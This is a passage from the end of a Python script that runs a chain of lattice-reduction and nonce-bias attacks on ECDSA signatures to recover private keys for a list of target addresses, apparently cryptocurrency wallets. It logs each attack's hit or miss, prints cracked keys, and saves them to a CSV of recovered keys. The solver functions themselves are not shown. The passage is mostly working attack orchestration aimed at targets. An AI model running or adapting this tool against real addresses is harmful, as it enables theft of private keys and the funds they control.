                print(f"  -> Middle-Bit w{w}@{s} ({use} sigs)...", end="", flush=True)
                d = solve_middle_bits(pub, sigs[:use], w, s)
                if d:
                    print(" CRACKED!")
                    success = True
                    recovered.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"Middle-Bit w{w}@{s}"})
                    break
                print(" miss")

        if not success:
            for bias, req_s in [(64, 20), (48, 15)]:
                if success: break
                if len(sigs) < req_s: continue
                print(f"  -> Linear Bias {bias}-bit ({req_s} sigs)...", end="", flush=True)
                d = solve_linear_nonce(pub, sigs[:req_s], bias)
                if d:
                    print(" CRACKED!")
                    success = True
                    recovered.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"Linear Bias {bias}-bit"})
                    break
                print(" miss")

        if not success:
            for shared, req_s in [(32, 15), (64, 10)]:
                if success: break
                if len(sigs) < req_s: continue
                print(f"  -> Shared LSB {shared}-bit ({req_s} sigs)...", end="", flush=True)
                d = solve_shared_lsb(pub, sigs[:req_s], shared)
                if d:
                    print(" CRACKED!")
                    success = True
                    recovered.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"Shared LSB {shared}-bit"})
                    break
                print(" miss")

        if not success:
            for err, req_s in [(32, 18), (64, 12)]:
                if success: break
                if len(sigs) < req_s: continue
                print(f"  -> Sequential {err}-bit ({req_s} sigs)...", end="", flush=True)
                d = solve_sequential_nonce(pub, sigs[:req_s], err)
                if d:
                    print(" CRACKED!")
                    success = True
                    recovered.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"Sequential {err}-bit"})
                    break
                print(" miss")

        if not success:
            has_meta = any('leak_type' in s for s in sigs)
            if has_meta and len(sigs) >= 8:
                print(f"  -> Multi-Leak Fusion ({len(sigs)} sigs)...", end="", flush=True)
                d = solve_multi_fusion(pub, sigs)
                if d:
                    print(" CRACKED!")
                    success = True
                    recovered.append({"address": address, "pub": pub, "priv": hex(d), "bug": "Multi-Leak Fusion"})
                else:
                    print(" miss")
        gc.collect()

        # ════════════════ PHASE 3: DEEP REDUCTION ════════════════════════
        if not success:
            print(f"\n[PHASE 3] Deep Reduction (Kannan + BKZ + RoundOff)...")

            # Only 3 bit sizes (was 6 — skip 64/32 which Phase 1 already covers)
            for bits in [8, 6, 4]:
                if success: break
                req = min_sigs(bits)
                if len(sigs) < req: continue
                use = min(len(sigs), req + 4)

                print(f"  -> Kannan Embedding {bits}-bit ({use} sigs)...", end="", flush=True)
                d = solve_kannan_embedding(pub, sigs[:use], bits, progressive=True)
                if d:
                    print(" CRACKED!")
                    success = True
                    recovered.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"Kannan Embedding {bits}-bit"})
                    break
                print(" miss")

            if not success:
                for bits in [8, 6, 4]:
                    if success: break
                    req = min_sigs(bits)
                    if len(sigs) < req: continue
                    use = min(len(sigs), req + 4)

                    print(f"  -> Progressive-BKZ MSB {bits}-bit ({use} sigs)...", end="", flush=True)
                    d = solve_progressive_msb(pub, sigs[:use], bits)
                    if d:
                        print(" CRACKED!")
                        success = True
                        recovered.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"Progressive-BKZ MSB {bits}-bit"})
                        break
                    print(" miss")

                    print(f"  -> Progressive-BKZ LSB {bits}-bit ({use} sigs)...", end="", flush=True)
                    d = solve_progressive_lsb(pub, sigs[:use], bits)
                    if d:
                        print(" CRACKED!")
                        success = True
                        recovered.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"Progressive-BKZ LSB {bits}-bit"})
                        break
                    print(" miss")

            if not success:
                for bits in [8, 6]:
                    if success: break
                    req = min_sigs(bits)
                    if len(sigs) < req: continue
                    use = min(len(sigs), req + 4)
                    print(f"  -> Greedy Round-Off {bits}-bit ({use} sigs)...", end="", flush=True)
                    d = solve_greedy_roundoff(pub, sigs[:use], bits)
                    if d:
                        print(" CRACKED!")
                        success = True
                        recovered.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"Greedy Round-Off {bits}-bit"})
                        break
                    print(" miss")
            gc.collect()

        # ════════════════ RESULT ══════════════════════════════════════════
        if success:
            k = recovered[-1]
            print("\n" + "!" * 70)
            print(f"   [SUCCESS] CRACKED!")
            print(f"   METHOD:  {k['bug']}")
            print(f"   ADDRESS: {address}")
            print(f"   KEY:     {k['priv']}")
            print("!" * 70)
        else:
            print(f"\n   [FAILED] All 16 attacks exhausted.")
            # Move failed JSON from pass -> processed (keep successful ones in pass)
            src = tgt.get('_source_file', '')
            if src and os.path.isfile(src):
                dst = os.path.join(processed_dir, os.path.basename(src))
                shutil.move(src, dst)
                print(f"   -> Moved to {dst}")

    # Save results
    if recovered:
        out_csv = os.path.join(script_dir, "ADVANCED_RECOVERED_KEYS.csv")
        with open(out_csv, "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["Address", "Public Key", "Private Key Hex", "Attack Method"])
            for row in recovered:
                w.writerow([row['address'], row['pub'], row['priv'], row['bug']])
        print(f"\n[+] Saved {len(recovered)} keys → {out_csv}")
    else:
        print("\n[-] No keys recovered.")

    print(f"\n{'=' * 70}")
    print(f"   SUMMARY: {len(recovered)} / {len(targets)} targets cracked")
    print(f"{'=' * 70}")


if __name__ == "__main__":
    main()
